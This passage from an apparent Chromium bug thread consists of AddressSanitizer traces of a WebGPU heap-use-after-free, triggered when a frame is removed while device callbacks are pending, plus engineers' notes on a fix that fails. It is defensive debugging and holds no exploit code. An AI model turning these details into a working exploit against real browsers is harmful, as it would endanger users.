    #18 0x7ffe98f9c3bf in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class base::TimeDelta) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:467:12
    #19 0x7ffe9556ce11 in base::RunLoop::Run(class base::Location const &) C:\src\chromium\chromium\src\base\run_loop.cc:134:14
    #20 0x7ffe9881d356 in content::RendererMain(struct content::MainFunctionParams const &) C:\src\chromium\chromium\src\content\renderer\renderer_main.cc:265:16
    #21 0x7ffe8ed0b6ed in content::ContentMainRunnerImpl::Run(bool) C:\src\chromium\chromium\src\content\app\content_main_runner_impl.cc:973:10
    #22 0x7ffe8ed06c64 in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\src\chromium\chromium\src\content\app\content_main.cc:390:36
    #23 0x7ffe8ed08152 in content::ContentMain(struct content::ContentMainParams const &) C:\src\chromium\chromium\src\content\app\content_main.cc:418:10
    #24 0x7ffe84e315b2 in ChromeMain C:\src\chromium\chromium\src\chrome\app\chrome_main.cc:172:12
    #25 0x7ff6e05c8dd7 in MainDllLoader::Launch(struct HINSTANCE__*, class base::TimeTicks) C:\src\chromium\chromium\src\chrome\app\main_dll_loader_win.cc:169:12
    #26 0x7ff6e05c3c28 in main C:\src\chromium\chromium\src\chrome\app\chrome_exe_main_win.cc:382:20
    #27 0x7ff6e0b73d2f in invoke_main d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:78
    #28 0x7ff6e0b73d2f in __scrt_common_main_seh d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288
    #29 0x7fff56f17c23  (C:\WINDOWS\System32\KERNEL32.DLL+0x180017c23)
    #30 0x7fff577ed720  (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006d720)

0x1238c4485cb0 is located 0 bytes inside of 8-byte region [0x1238c4485cb0,0x1238c4485cb8)
freed by thread T0 here:
    #0 0x7ff6e069930b in free C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:82
    #1 0x7ffe9a6ee67e in dawn_wire::client::Client::Disconnect(void) C:\src\chromium\chromium\src\third_party\dawn\src\dawn_wire\client\Client.cpp:141:56
    #2 0x7ffe8cec412a in gpu::webgpu::DawnWireServices::Disconnect(void) C:\src\chromium\chromium\src\gpu\command_buffer\client\webgpu_implementation.cc:58:18
    #3 0x7ffeac1d7647 in blink::DawnControlClientHolder::Destroy(void) C:\src\chromium\chromium\src\third_party\blink\renderer\platform\graphics\gpu\dawn_control_client_holder.cc:41:17
    #4 0x7ffeac23f4ab in blink::GPU::ContextDestroyed(void) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\gpu.cc:153:25
    #5 0x7ffe98611efd in blink::ContextLifecycleObserver::NotifyContextDestroyed(void) C:\src\chromium\chromium\src\third_party\blink\renderer\platform\context_lifecycle_observer.cc:46:3
    #6 0x7ffea0f97e5c in blink::ContextLifecycleNotifier::NotifyContextDestroyed::<lambda_0>::operator() C:\src\chromium\chromium\src\third_party\blink\renderer\platform\context_lifecycle_notifier.cc:31
    #7 0x7ffea0f97e5c in blink::HeapObserverSet<blink::ContextLifecycleObserver>::ForEachObserver C:\src\chromium\chromium\src\third_party\blink\renderer\platform\heap_observer_set.h:67
    #8 0x7ffea0f97e5c in blink::ContextLifecycleNotifier::NotifyContextDestroyed(void) C:\src\chromium\chromium\src\third_party\blink\renderer\platform\context_lifecycle_notifier.cc:30:14
    #9 0x7ffe9be62f42 in blink::LocalDOMWindow::FrameDestroyed(void) C:\src\chromium\chromium\src\third_party\blink\renderer\core\frame\local_dom_window.cc:839:3
    #10 0x7ffe9ba9bf8a in blink::LocalFrame::DetachImpl(enum blink::FrameDetachType) C:\src\chromium\chromium\src\third_party\blink\renderer\core\frame\local_frame.cc:546:16
    #11 0x7ffe9ba6658e in blink::Frame::Detach(enum blink::FrameDetachType) C:\src\chromium\chromium\src\third_party\blink\renderer\core\frame\frame.cc:109:8
    #12 0x7ffe9ff69608 in blink::ChildFrameDisconnector::DisconnectCollectedFrameOwners(void) C:\src\chromium\chromium\src\third_party\blink\renderer\core\dom\child_frame_disconnector.cc:58:14
    #13 0x7ffe9ff67b6c in blink::ChildFrameDisconnector::Disconnect(enum blink::ChildFrameDisconnector::DisconnectPolicy) C:\src\chromium\chromium\src\third_party\blink\renderer\core\dom\child_frame_disconnector.cc:31:3
    #14 0x7ffe9c5e538f in blink::ContainerNode::WillRemoveChild(class blink::Node &) C:\src\chromium\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:630:33
    #15 0x7ffe9c5e3d58 in blink::ContainerNode::RemoveChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:736:3
    #16 0x7ffe9c235abb in blink::Node::removeChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\chromium\src\third_party\blink\renderer\core\dom\node.cc:742:23
    #17 0x7ffea1a33d42 in blink::`anonymous namespace'::v8_node::RemoveChildOperationCallback C:\src\chromium\chromium\src\out\Asan\gen\third_party\blink\renderer\bindings\core\v8\v8_node.cc:954:23
    #18 0x7ffe8f03eb7c in v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo) C:\src\chromium\chromium\src\v8\src\api\api-arguments-inl.h:152:3
    #19 0x7ffe8f038a64 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\src\chromium\chromium\src\v8\src\builtins\builtins-api.cc:112:36
    #20 0x7ffe8f0318e8 in v8::internal::Builtin_Impl_HandleApiCall C:\src\chromium\chromium\src\v8\src\builtins\builtins-api.cc:142:5
    #21 0x7ffe8f0303d2 in v8::internal::Builtin_HandleApiCall(int, unsigned __int64 *, class v8::internal::Isolate *) C:\src\chromium\chromium\src\v8\src\builtins\builtins-api.cc:130:1
    #22 0x7ee4000d029b  (<unknown module>)

previously allocated by thread T0 here:
    #0 0x7ff6e069940b in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ffeaf5f568a in operator new(unsigned __int64) d:\A01\_work\6\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:35
    #2 0x7ffeaae80d5d in blink::CreateDawnCallback<class base::OnceCallback<(char const *)>>(class base::OnceCallback<(char const *)>) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h:87:10
    #3 0x7ffeaae773be in blink::BindDawnCallback C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\dawn_callback.h:93
    #4 0x7ffeaae773be in blink::GPUDevice::GPUDevice(class blink::ExecutionContext *, class scoped_refptr<class blink::DawnControlClientHolder>, class blink::GPUAdapter *, struct WGPUDeviceImpl *, class blink::GPUDeviceDescriptor const *) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc:77:22
    #5 0x7ffeaae9addc in cppgc::MakeGarbageCollectedTrait<class blink::GPUDevice>::Call<class blink::ExecutionContext *&, class scoped_refptr<class blink::DawnControlClientHolder> const &, class blink::GPUAdapter *, struct WGPUDeviceImpl *&, class blink::GPUDeviceDescriptor const *&>(class cppgc::AllocationHandle &, class blink::ExecutionContext *&, class scoped_refptr<class blink::DawnControlClientHolder> const &, class blink::GPUAdapter *&&, struct WGPUDeviceImpl *&, class blink::GPUDeviceDescriptor const *&) C:\src\chromium\chromium\src\v8\include\cppgc\allocation.h:174:32
    #6 0x7ffeaae979eb in cppgc::MakeGarbageCollected C:\src\chromium\chromium\src\v8\include\cppgc\allocation.h:212
    #7 0x7ffeaae979eb in blink::MakeGarbageCollected C:\src\chromium\chromium\src\third_party\blink\renderer\platform\heap\v8_wrapper\heap.h:26
    #8 0x7ffeaae979eb in blink::GPUAdapter::OnRequestDeviceCallback(class blink::ScriptState *, class blink::ScriptPromiseResolver *, class blink::GPUDeviceDescriptor const *, struct WGPUDeviceImpl *) C:\src\chromium\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_adapter.cc:107:20    
    #9 0x7ffeaae9c894 in base::internal::FunctorTraits<void (blink::GPUAdapter::*)(blink::ScriptState *, blink::ScriptPromiseResolver *, const blink::GPUDeviceDescriptor *, WGPUDeviceImpl *),void>::Invoke C:\src\chromium\chromium\src\base\bind_internal.h:509
    #10 0x7ffeaae9c894 in base::internal::InvokeHelper<0,void>::MakeItSo C:\src\chromium\chromium\src\base\bind_internal.h:648
    #11 0x7ffeaae9c894 in base::internal::Invoker<base::internal::BindState<void (blink::GPUAdapter::*)(blink::ScriptState *, blink::ScriptPromiseResolver *, const blink::GPUDeviceDescriptor *, WGPUDeviceImpl *),cppgc::internal::BasicPersistent<blink::GPUAdapter,cppgc::internal::StrongPersistentPolicy,cppgc::internal::IgnoreLocationPolicy,cppgc::internal::DisabledCheckingPolicy>,cppgc::internal::BasicPersistent<blink::ScriptState,cppgc::internal::StrongPersistentPolicy,cppgc::internal::IgnoreLocationPolicy,cppgc::internal::DisabledCheckingPolicy>,cppgc::internal::BasicPersistent<blink::ScriptPromiseResolver,cppgc::internal::StrongPersistentPolicy,cppgc::internal::IgnoreLocationPolicy,cppgc::internal::DisabledCheckingPolicy>,cppgc::internal::BasicPersistent<blink::GPUDeviceDescriptor,cppgc::internal::StrongPersistentPolicy,cppgc::internal::IgnoreLocationPolicy,cppgc::internal::DisabledCheckingPolicy> >,void (WGPUDeviceImpl *)>::RunImpl C:\src\chromium\chromium\src\base\bind_internal.h:721
    #12 0x7ffeaae9c894 in base::internal::Invoker<struct base::internal::BindState<void (__cdecl blink::GPUAdapter::*)(class blink::ScriptState *, class blink::ScriptPromiseResolver *, class blink::GPUDeviceDescriptor const *, struct WGPUDeviceImpl *), class cppgc::internal::BasicPersistent<class blink::GPUAdapter, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::ScriptState, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::ScriptPromiseResolver, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>, class cppgc::internal::BasicPersistent<class blink::GPUDeviceDescriptor, struct cppgc::internal::StrongPersistentPolicy, class cppgc::internal::IgnoreLocationPolicy, class cppgc::internal::DisabledCheckingPolicy>>, (struct WGPUDeviceImpl *)>::RunOnce(class base::internal::BindStateBase *, struct WGPUDeviceImpl *) C:\src\chromium\chromium\src\base\bind_internal.h:690:12
    #13 0x7ffe8cec2a85 in base::OnceCallback<(struct WGPUDeviceImpl *)>::Run(struct WGPUDeviceImpl *) && C:\src\chromium\chromium\src\base\callback.h:98:12
    #14 0x7ffeaae9c797 in WTF::ThreadCheckingCallbackWrapper<base::OnceCallback<void (WGPUDeviceImpl *)>,void (WGPUDeviceImpl *)>::RunInternal C:\src\chromium\chromium\src\third_party\blink\renderer\platform\wtf\functional.h:225
    #15 0x7ffeaae9c797 in WTF::ThreadCheckingCallbackWrapper<class base::OnceCallback<(struct WGPUDeviceImpl *)>, (struct WGPUDeviceImpl *)>::Run(struct WGPUDeviceImpl *) C:\src\chromium\chromium\src\third_party\blink\renderer\platform\wtf\functional.h:210:12
    #16 0x7ffe8cec7b17 in base::OnceCallback<void (WGPUDeviceImpl *)>::Run C:\src\chromium\chromium\src\base\callback.h:99
    #17 0x7ffe8cec7b17 in gpu::webgpu::WebGPUImplementation::RequestDeviceAsync::<lambda_0>::operator() C:\src\chromium\chromium\src\gpu\command_buffer\client\webgpu_implementation.cc:590
    #18 0x7ffe8cec7b17 in base::internal::FunctorTraits<`lambda at ../../gpu/command_buffer/client/webgpu_implementation.cc:581:7',void>::Invoke C:\src\chromium\chromium\src\base\bind_internal.h:390
    #19 0x7ffe8cec7b17 in base::internal::InvokeHelper<0,void>::MakeItSo C:\src\chromium\chromium\src\base\bind_internal.h:648
    #20 0x7ffe8cec7b17 in base::internal::Invoker<base::internal::BindState<`lambda at ../../gpu/command_buffer/client/webgpu_implementation.cc:581:7',scoped_refptr<gpu::webgpu::DawnWireServices>,dawn_wire::ReservedDevice,base::OnceCallback<void (WGPUDeviceImpl *)> >,void (bool)>::RunImpl C:\src\chromium\chromium\src\base\bind_internal.h:721
    #21 0x7ffe8cec7b17 in base::internal::Invoker<base::internal::BindState<`lambda at ../../gpu/command_buffer/client/webgpu_implementation.cc:581:7',scoped_refptr<gpu::webgpu::DawnWireServices>,dawn_wire::ReservedDevice,base::OnceCallback<void (WGPUDeviceImpl *)> >,void (bool)>::RunOnce C:\src\chromium\chromium\src\base\bind_internal.h:690:12
    #22 0x7ffe85362d07 in base::OnceCallback<(bool)>::Run(bool) && C:\src\chromium\chromium\src\base\callback.h:98:12
    #23 0x7ffe8cebffb8 in gpu::webgpu::WebGPUImplementation::OnGpuControlReturnData(class base::span<unsigned char const, -1>) C:\src\chromium\chromium\src\gpu\command_buffer\client\webgpu_implementation.cc:439:35
    #24 0x7ffe8873430b in gpu::CommandBufferProxyImpl::OnReturnData(class std::__1::vector<unsigned char, class std::__1::allocator<unsigned char>> const &) C:\src\chromium\chromium\src\gpu\ipc\client\command_buffer_proxy_impl.cc:615:26
    #25 0x7ffe87e6bc45 in gpu::mojom::CommandBufferClientStubDispatch::Accept(class gpu::mojom::CommandBufferClient *, class mojo::Message *) C:\src\chromium\chromium\src\out\Asan\gen\gpu\ipc\common\gpu_channel.mojom.cc:6488:13
    #26 0x7ffe95a8d748 in mojo::InterfaceEndpointClient::HandleValidatedMessage(class mojo::Message *) C:\src\chromium\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:898:54
    #27 0x7ffe991d2f68 in mojo::MessageDispatcher::Accept(class mojo::Message *) C:\src\chromium\chromium\src\mojo\public\cpp\bindings\lib\message_dispatcher.cc:43:19
    #28 0x7ffe95a9271a in mojo::InterfaceEndpointClient::HandleIncomingMessage(class mojo::Message *) C:\src\chromium\chromium\src\mojo\public\cpp\bindings\lib\interface_endpoint_client.cc:655:20
    #29 0x7ffe966d4cef in IPC::`anonymous namespace'::ChannelAssociatedGroupController::AcceptOnEndpointThread C:\src\chromium\chromium\src\ipc\ipc_mojo_bootstrap.cc:981:24
    #30 0x7ffe966cb10d in base::internal::FunctorTraits<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),void>::Invoke C:\src\chromium\chromium\src\base\bind_internal.h:509
    #31 0x7ffe966cb10d in base::internal::InvokeHelper<0,void>::MakeItSo C:\src\chromium\chromium\src\base\bind_internal.h:648
    #32 0x7ffe966cb10d in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunImpl C:\src\chromium\chromium\src\base\bind_internal.h:721
    #33 0x7ffe966cb10d in base::internal::Invoker<base::internal::BindState<void (IPC::(anonymous namespace)::ChannelAssociatedGroupController::*)(mojo::Message),scoped_refptr<IPC::(anonymous namespace)::ChannelAssociatedGroupController>,mojo::Message>,void ()>::RunOnce C:\src\chromium\chromium\src\base\bind_internal.h:690:12
    #34 0x7ffe9561b74b in base::OnceCallback<void ()>::Run C:\src\chromium\chromium\src\base\callback.h:99
    #35 0x7ffe9561b74b in base::TaskAnnotator::RunTask(char const *, struct base::PendingTask *) C:\src\chromium\chromium\src\base\task\common\task_annotator.cc:178:33
    #36 0x7ffe98f99bef in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence_manager::LazyNow *) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:360:23
    #37 0x7ffe98f98108 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork(void) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:260:36
    #38 0x7ffe98f4e3c3 in base::MessagePumpDefault::Run(class base::MessagePump::Delegate *) C:\src\chromium\chromium\src\base\message_loop\message_pump_default.cc:39:55
    #39 0x7ffe98f9c3bf in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, class base::TimeDelta) C:\src\chromium\chromium\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:467:12
    #40 0x7ffe9556ce11 in base::RunLoop::Run(class base::Location const &) C:\src\chromium\chromium\src\base\run_loop.cc:134:14
    #41 0x7ffe9881d356 in content::RendererMain(struct content::MainFunctionParams const &) C:\src\chromium\chromium\src\content\renderer\renderer_main.cc:265:16
    #42 0x7ffe8ed0b6ed in content::ContentMainRunnerImpl::Run(bool) C:\src\chromium\chromium\src\content\app\content_main_runner_impl.cc:973:10
    #43 0x7ffe8ed06c64 in content::RunContentProcess(struct content::ContentMainParams const &, class content::ContentMainRunner *) C:\src\chromium\chromium\src\content\app\content_main.cc:390:36

SUMMARY: AddressSanitizer: heap-use-after-free C:\src\chromium\chromium\src\base\memory\scoped_refptr.h:224 in scoped_refptr<base::internal::BindStateBase>::~scoped_refptr
Shadow bytes around the buggy address:
  0x047bdcc90b40: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa
  0x047bdcc90b50: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa
  0x047bdcc90b60: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa
  0x047bdcc90b70: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fa
  0x047bdcc90b80: fa fa fd fa fa fa fd fa fa fa 00 00 fa fa fd fa
=>0x047bdcc90b90: fa fa fd fa fa fa[fd]fa fa fa fd fd fa fa fd fa
  0x047bdcc90ba0: fa fa fd fa fa fa fd fa fa fa fd fa fa fa 00 00
  0x047bdcc90bb0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fd fa
  0x047bdcc90bc0: fa fa fa fa fa fa fd fd fa fa fd fa fa fa fd fa
  0x047bdcc90bd0: fa fa fd fd fa fa 00 fa fa fa fa fa fa fa fd fa
  0x047bdcc90be0: fa fa fd fd fa fa fd fd fa fa fd fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==8804==ABORTING
[56004:48804:0826/142335.315:WARNING:sad_tab.cc(295)] Tab Killed: file:///

### en...@chromium.org (2021-08-26)

Note: the crash stack I'm getting from an ASAN build is the same whether I use the OP's test or my test.

### en...@chromium.org (2021-08-26)

Shrek started the suggested fix we talked about in https://crbug.com/chromium/1242269#c8 in https://chromium-review.googlesource.com/c/chromium/src/+/3123381.

I cherry-picked this and tried it out. Still get a crash with ASAN, basically the same as in https://crbug.com/chromium/1242269#c10.
So I think the race is a bigger issue breaking our assumptions about when things are called.

### sh...@google.com (2021-08-26)

I can verify with callbacks set to null in ~GPUDevice, enga@'s new uaf-request-device-loop.html still triggers the FinalizePage crash

==51568==ERROR: AddressSanitizer: heap-use-after-free on address 0x120b2c735610 at pc 0x7ffda8a89b4c bp 0x00c0a5bf15e0 sp 0x00c0a5bf1628
READ of size 8 at 0x120b2c735610 thread T0
    #0 0x7ffda8a89b4b in base::internal::CallbackBase::~CallbackBase(void) C:\src\chromium\src\base\callback_internal.cc:85:29
    #1 0x7ffd61a57c18 in std::__1::unique_ptr<class blink::DawnCallback<class base::OnceCallback<(char const *)>>, struct std::__1::default_delete<class blink::DawnCallback<class base::OnceCallback<(char const *)>>>>::reset(class blink::DawnCallback<class base::OnceCallback<(char const *)>> *) C:\src\chromium\src\buildtools\third_party\libc++\trunk\include\__memory\unique_ptr.h:315:7
    #2 0x7ffd61a4abd4 in blink::GPUDevice::~GPUDevice(void) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc:108:1
    #3 0x7ffd61a503ba in blink::GPUDevice::`scalar deleting dtor'(unsigned int) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\gpu_device.cc:102:25
    #4 0x7ffd77912056 in cppgc::internal::`anonymous namespace'::SweepFinalizer::FinalizePage C:\src\chromium\src\v8\src\heap\cppgc\sweeper.cc:373:15
    #5 0x7ffd7790cb68 in cppgc::internal::Sweeper::SweeperImpl::Finish(void) C:\src\chromium\src\v8\src\heap\cppgc\sweeper.cc:766:15
    #6 0x7ffd7790abef in cppgc::internal::Sweeper::SweeperImpl::FinishIfRunning(void) C:\src\chromium\src\v8\src\heap\cppgc\sweeper.cc:754:7
    #7 0x7ffd778ef102 in cppgc::internal::ObjectAllocator::OutOfLineAllocateImpl(class cppgc::internal::NormalPageSpace &, unsigned __int64, unsigned short) C:\src\chromium\src\v8\src\heap\cppgc\object-allocator.cc:158:11
    #8 0x7ffd778eee85 in cppgc::internal::ObjectAllocator::OutOfLineAllocate(class cppgc::internal::NormalPageSpace &, unsigned __int64, unsigned short) C:\src\chromium\src\v8\src\heap\cppgc\object-allocator.cc:112:18
    #9 0x7ffd6623a780 in blink::DocumentInit::CreateDocument(void) const C:\src\chromium\src\third_party\blink\renderer\core\dom\document_init.cc:261:14
    #10 0x7ffd66b76248 in blink::LocalDOMWindow::InstallNewDocument(class blink::DocumentInit const &) C:\src\chromium\src\third_party\blink\renderer\core\frame\local_dom_window.cc:666:20
    #11 0x7ffd6895f845 in blink::DocumentLoader::CommitNavigation(void) C:\src\chromium\src\third_party\blink\renderer\core\loader\document_loader.cc:2260:45
    #12 0x7ffd6899caf1 in blink::FrameLoader::CommitDocumentLoader(class blink::DocumentLoader *, class absl::optional<struct blink::Document::UnloadEventTiming> const &, class blink::HistoryItem *, enum blink::CommitReason) C:\src\chromium\src\third_party\blink\renderer\core\loader\frame_loader.cc:1222:21
    #13 0x7ffd689a4f94 in blink::FrameLoader::CommitNavigation(class std::__1::unique_ptr<struct blink::WebNavigationParams, struct std::__1::default_delete<struct blink::WebNavigationParams>>, class std::__1::unique_ptr<class blink::WebDocumentLoader::ExtraData, struct std::__1::default_delete<class blink::WebDocumentLoader::ExtraData>>, enum blink::CommitReason) C:\src\chromium\src\third_party\blink\renderer\core\loader\frame_loader.cc:1061:3
    #14 0x7ffd66e8654e in blink::WebLocalFrameImpl::CommitNavigation(class std::__1::unique_ptr<struct blink::WebNavigationParams, struct std::__1::default_delete<struct blink::WebNavigationParams>>, class std::__1::unique_ptr<class blink::WebDocumentLoader::ExtraData, struct std::__1::default_delete<class blink::WebDocumentLoader::ExtraData>>) C:\src\chromium\src\third_party\blink\renderer\core\frame\web_local_frame_impl.cc:2342:24
    #15 0x7ffd901e47d6 in content::RenderFrameImpl::SynchronouslyCommitAboutBlankForBug778318(class std::__1::unique_ptr<struct blink::WebNavigationInfo, struct std::__1::default_delete<struct blink::WebNavigationInfo>>) C:\src\chromium\src\content\renderer\render_frame_impl.cc:5347:11
    #16 0x7ffd901e12ec in content::RenderFrameImpl::BeginNavigation(class std::__1::unique_ptr<struct blink::WebNavigationInfo, struct std::__1::default_delete<struct blink::WebNavigationInfo>>) C:\src\chromium\src\content\renderer\render_frame_impl.cc:5299:7
    #17 0x7ffd66e15b32 in blink::LocalFrameClientImpl::BeginNavigation(class blink::ResourceRequest const &, enum blink::mojom::RequestContextFrameType, class blink::LocalDOMWindow *, class blink::DocumentLoader *, enum blink::WebNavigationType, enum blink::NavigationPolicy, enum blink::WebFrameLoadType, bool, enum blink::mojom::TriggeringEventInfo, class blink::HTMLFormElement *, enum network::mojom::CSPDisposition, class mojo::PendingRemote<class blink::mojom::blink::BlobURLToken>, class base::TimeTicks, class WTF::String const &, class absl::optional<struct blink::WebImpression> const &, enum network::mojom::IPAddressSpace, class base::TokenType<class blink::LocalFrameTokenTypeMarker> const *, class std::__1::unique_ptr<class blink::SourceLocation, struct std::__1::default_delete<class blink::SourceLocation>>, class mojo::PendingRemote<class blink::mojom::blink::PolicyContainerHostKeepAliveHandle>) C:\src\chromium\src\third_party\blink\renderer\core\frame\local_frame_client_impl.cc:639:25
    #18 0x7ffd689a22de in blink::FrameLoader::StartNavigation(struct blink::FrameLoadRequest &, enum blink::WebFrameLoadType) C:\src\chromium\src\third_party\blink\renderer\core\loader\frame_loader.cc:791:13
    #19 0x7ffd672443f6 in blink::HTMLFrameOwnerElement::LoadOrRedirectSubframe(class blink::KURL const &, class WTF::AtomicString const &, bool) C:\src\chromium\src\third_party\blink\renderer\core\html\html_frame_owner_element.cc:631:25
    #20 0x7ffd6723a6df in blink::HTMLFrameElementBase::OpenURL(bool) C:\src\chromium\src\third_party\blink\renderer\core\html\html_frame_element_base.cc:106:3
    #21 0x7ffd6723ca47 in blink::HTMLFrameElementBase::SetNameAndOpenURL(void) C:\src\chromium\src\third_party\blink\renderer\core\html\html_frame_element_base.cc:182:3
    #22 0x7ffd6723cf44 in blink::HTMLFrameElementBase::DidNotifySubtreeInsertionsToDocument(void) C:\src\chromium\src\third_party\blink\renderer\core\html\html_frame_element_base.cc:204:5
    #23 0x7ffd66120b14 in blink::ContainerNode::DidInsertNodeVector(class blink::HeapVector<class cppgc::internal::BasicMember<class blink::Node, class cppgc::internal::StrongMemberTag, struct cppgc::internal::DijkstraWriteBarrierPolicy, class cppgc::internal::DisabledCheckingPolicy>, 11> const &, class blink::Node *, class blink::HeapVector<class cppgc::internal::BasicMember<class blink::Node, class cppgc::internal::StrongMemberTag, struct cppgc::internal::DijkstraWriteBarrierPolicy, class cppgc::internal::DisabledCheckingPolicy>, 11> const &) C:\src\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:350:19
    #24 0x7ffd6612231c in blink::ContainerNode::AppendChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:916:3
    #25 0x7ffd663c944a in blink::Node::appendChild(class blink::Node *, class blink::ExceptionState &) C:\src\chromium\src\third_party\blink\renderer\core\dom\node.cc:757:23
    #26 0x7ffd6a3057c7 in blink::`anonymous namespace'::v8_node::AppendChildOperationCallbackForMainWorld C:\src\chromium\src\out\Asan\gen\third_party\blink\renderer\bindings\core\v8\v8_node.cc:476:41
    #27 0x7ffd75368956 in v8::internal::FunctionCallbackArguments::Call(class v8::internal::CallHandlerInfo) C:\src\chromium\src\v8\src\api\api-arguments-inl.h:152:3
    #28 0x7ffd753637a9 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> C:\src\chromium\src\v8\src\builtins\builtins-api.cc:112:36
    #29 0x7ffd7535e157 in v8::internal::Builtin_Impl_HandleApiCall C:\src\chromium\src\v8\src\builtins\builtins-api.cc:142:5
    #30 0x7ffd7535d031 in v8::internal::Builtin_HandleApiCall(int, unsigned __int64 *, class v8::internal::Isolate *) C:\src\chromium\src\v8\src\builtins\builtins-api.cc:130:1
    #31 0x7e96000d029b  (<unknown module>)

0x120b2c735610 is located 0 bytes inside of 8-byte region [0x120b2c735610,0x120b2c735618)
freed by thread T0 here:
    #0 0x7ffda815e07b  (C:\src\chromium\src\out\Asan\clang_rt.asan_dynamic-x86_64.dll+0x18003e07b)
    #1 0x7ffd42fc5a27 in dawn_wire::client::Client::Disconnect(void) C:\src\chromium\src\third_party\dawn\src\dawn_wire\client\Client.cpp:141:56
    #2 0x7ffd494eb3c0 in gpu::webgpu::DawnWireServices::Disconnect(void) C:\src\chromium\src\gpu\command_buffer\client\webgpu_implementation.cc:58:18
    #3 0x7ffd707c3c4c in blink::DawnControlClientHolder::Destroy(void) C:\src\chromium\src\third_party\blink\renderer\platform\graphics\gpu\dawn_control_client_holder.cc:41:17
    #4 0x7ffd61a1b755 in blink::GPU::ContextDestroyed(void) C:\src\chromium\src\third_party\blink\renderer\modules\webgpu\gpu.cc:153:25
    #5 0x7ffd703b94aa in blink::ContextLifecycleObserver::NotifyContextDestroyed(void) C:\src\chromium\src\third_party\blink\renderer\platform\context_lifecycle_observer.cc:46:3
    #6 0x7ffd703b35c2 in blink::ContextLifecycleNotifier::NotifyContextDestroyed(void) C:\src\chromium\src\third_party\blink\renderer\platform\context_lifecycle_notifier.cc:30:14
    #7 0x7ffd66b7ea79 in blink::LocalDOMWindow::FrameDestroyed(void) C:\src\chromium\src\third_party\blink\renderer\core\frame\local_dom_window.cc:853:3
    #8 0x7ffd66bc706e in blink::LocalFrame::DetachImpl(enum blink::FrameDetachType) C:\src\chromium\src\third_party\blink\renderer\core\frame\local_frame.cc:546:16
    #9 0x7ffd66b155c0 in blink::Frame::Detach(enum blink::FrameDetachType) C:\src\chromium\src\third_party\blink\renderer\core\frame\frame.cc:109:8
    #10 0x7ffd66108b91 in blink::ChildFrameDisconnector::DisconnectCollectedFrameOwners(void) C:\src\chromium\src\third_party\blink\renderer\core\dom\child_frame_disconnector.cc:58:14
    #11 0x7ffd661074c1 in blink::ChildFrameDisconnector::Disconnect(enum blink::ChildFrameDisconnector::DisconnectPolicy) C:\src\chromium\src\third_party\blink\renderer\core\dom\child_frame_disconnector.cc:31:3
    #12 0x7ffd66128ae9 in blink::ContainerNode::WillRemoveChild(class blink::Node &) C:\src\chromium\src\third_party\blink\renderer\core\dom\container_node.cc:630:33
